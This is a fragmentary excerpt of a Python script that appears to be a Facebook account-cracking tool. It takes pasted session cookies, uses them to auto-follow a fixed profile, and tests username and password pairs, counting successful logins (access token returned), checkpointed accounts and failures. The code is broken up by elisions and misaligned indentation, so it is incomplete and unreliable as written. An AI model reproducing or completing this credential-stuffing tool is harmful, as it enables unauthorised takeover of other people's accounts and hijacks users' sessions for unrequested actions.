...
def masuk():
    try:
          ...
          cek = input("\033[00mCookies : \033[0;39m")
    cek = {"cookie":cek}
    ...
    if "mbasic_logout_button" in str(ismi):
        if "Apa yang Anda pikirkan sekarang" in str(ismi):
            ...
            try:
                 ...
                 pass
        try:
             ikuti = parser(requests.get(mbasic.format("/la.angel.79"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
...
def login(username,password,cek=False):
          ...
          if 'EAA' in response.text:
              print(f"\r\033[00m[\033[0;32mOK\033[00m] \033[0;32m{username}\033[90m|\033[0;32m{password}                        ",end="")
              print()
              result += 1
              if cek:
                ...
                print(f"\r\033[00m[\033[0;91mCP\033[00m] \033[0;33m{username}\033[90m|\033[0;33m{password}                      ",end="")
                print()
                chek += 1
                if cek:
                ...
                die += 1
          tk=['\033[0;97m#','\033[0;96m#','\033[0;97m#','\033[0;91m#']
          for o in tk:
                     print(f"\r\033[00m[{o}\033[00m] Life : \033[0;92m{str(result)} \033[00mCheck : \033[0;93m{str(chek)} \033[00mDie : \033[0;91m{str(die)}\033[00m",end="")
                     time.sleep(0.2)
def menu():
    clear()
    baner()
...
def pilih_menu():
    ...
    if ff == '1':
       ...
       print('\n\033[00m[\033[96m*\033[00m]Done.')
         ...
         sys.exit('\033[0;97mThanks For Using My Tools\n\033[91mexit\033[00m')
    else:
